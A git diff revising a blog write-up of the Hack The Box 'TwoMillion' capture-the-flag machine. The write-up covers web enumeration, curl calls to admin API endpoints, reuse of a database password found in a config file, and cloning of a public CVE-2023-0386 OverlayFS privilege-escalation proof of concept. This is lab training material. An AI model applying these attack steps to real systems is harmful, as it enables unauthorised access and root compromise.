@@ -2,7 +2,7 @@
 title: HTB - TwoMillion
 date: 2023-12-13
 categories: [CTF, Fullpwn]
-tags: [htb, hackthebox, nmap, fullpwn, http, js, cve-2023-0386, curl, burp-suite, cve-2023-4911]
+tags: [htb, hackthebox, nmap, fullpwn, http, js, cve-2023-0386, curl, burp-suite, cve-2023-4911, xor, base64, url-encoding, cyberchef, rot13, zap, glibc]
 img_path: /assets/two_million/
 published: true
 ---
@@ -32,6 +32,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Webserver Enumeration
 
+According to our Nmap results, the HTTP server redirects to the `2million.htb` domain, so we need to add it to our `/etc/hosts`:
+
 ```shell
 # add domain to /etc/hosts
 $ sudo nano /etc/hosts
@@ -39,23 +41,27 @@ $ sudo nano /etc/hosts
 
 ![](etc_hosts.png)
 
+Now we can access it:
+
 ![](home.png)
 
 ## Initial Foothold
 
+We can start by using ZAP's spider functionality:
+
 ![](zap_spider.png)
 
-![](join_button.png)
+The `inviteapi.min.js` looks interesting, so let's visit it:
 
 ![](zap_request.png)
 
-![](invite_one-line.png)
+It looks like obfuscated JavaScript code. We can visit it via our browser to get the code as a one-liner and then use [js-beautify](https://beautifier.io/) to deobfuscate it:
 
-The above JavaScript code is obfuscated, but we can use [js-beautify](https://beautifier.io/) to deobfuscate it:
+![](invite_one-line.png)
 
 ![](js_beautify.png)
 
-The code consists of two functions: `makeInviteCode()` and `verifyInviteCode()`. Following what the former functions guide us:
+The code consists of two functions: `makeInviteCode()` and `verifyInviteCode()`. Following what the former function telling us to do:
 
 ```shell
 # sent a POST request
@@ -91,7 +97,7 @@ Let's create an account and login:
 
 ![](logged_in.png)
 
-One of the few menu items that work is the Access tab:
+One of the few menu items that work is the *Access* tab:
 
 ![](access_tab.png)
 
@@ -148,7 +154,7 @@ $ curl -s http://2million.htb/api/v1 -H 'Cookie: PHPSESSID=f9ivlst65ugt596tnmqap
 }
 ```
 
-Let's try calling some endpoints:
+Let's try calling some of them:
 
 ```shell
 # check if acc is admin
@@ -170,13 +176,13 @@ $ curl http://2million.htb/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=f9
 {"status":"danger","message":"Invalid content type."}
 ```
 
-Going back to Burp, intercepting the login request, and trying the reach the above endpoint:
+Going back to Burp, intercepting the login request, and trying to reach the above endpoint:
 
 ![](login_request.png)
 
 ![](put_invalid_content.png)
 
-Since we get an *Invalid content type.* message, we can try changing the `Content-Type` field of the request:
+Since we get an "*Invalid content type.*" message, we can try changing the `Content-Type` field of the request:
 
 ![](missing_email.png)
 
@@ -255,7 +261,7 @@ DB_USERNAME=admin
 DB_PASSWORD=SuperDuperPass123
 ```
 
-Since we have some credentials, we can try to switch users to `admin`:
+Since we have some credentials, we can try switching to the `admin` user:
 
 ```shell
 # switch to user admin
@@ -267,13 +273,12 @@ See "man sudo_root" for details.
 # check our ID
 admin@2million:/var/www/html$ id
 uid=1000(admin) gid=1000(admin) groups=1000(admin)
-admin@2million:/var/www/html$
 
 # get the first flag
 admin@2million:/var/www/html$ cat /home/admin/user.txt
 ```
 
-After searching many directories, SUID files, etc. we find something of interest:
+After searching many directories, SUID files, etc., we mange to find something of interest:
 
 ```shell
 admin@2million:/var/mail$ cat admin
@@ -300,13 +305,14 @@ admin@2million:/var/mail$ uname -r
 5.15.70-051570-generic
 ```
 
-Googling for "*5.15.70-051570-generic vulnerabilities overlay fs*" we find an [article](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) which explains the CVE and also includes a [PoC](https://github.com/sxlmnwb/CVE-2023-0386):
+Googling for "*5.15.70-051570-generic vulnerabilities overlay fs*" we find an [article](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) which explains the CVE and also includes a link to a [PoC](https://github.com/sxlmnwb/CVE-2023-0386):
 
 ![](cve_google.png)
 
-In order to use the PoC, we must download the required files, transfer and execute them to the target, and then open a second connection with the target in order to execute both commands on different terminals. We can achieve the latter using SSH, hoping that the same credentials will work:
+In order to use the PoC, we must download the required files, transfer and execute them to the target, and then open a second connection with the target in order to execute the second command from a different terminal. We can achieve the latter using SSH, hoping that the same credentials will work:
 
 ```shell
+# downlading the required PoC files
 $ sudo git clone https://github.com/sxlmnwb/CVE-2023-0386
 Cloning into 'CVE-2023-0386'...
 remote: Enumerating objects: 13, done.
@@ -386,9 +392,6 @@ Now we have to establish a second connection with the target and execute the sec
 ```shell
 # log into SSH using the same credentials
 $  ssh admin@10.10.11.221
-# password: SuperDuperPass123
-admin@10.10.11.221's password:
-
 # move within the required directory
 admin@2million:/tmp$ cd /tmp/CVE-2023-0386/
 # execute the PoC's command
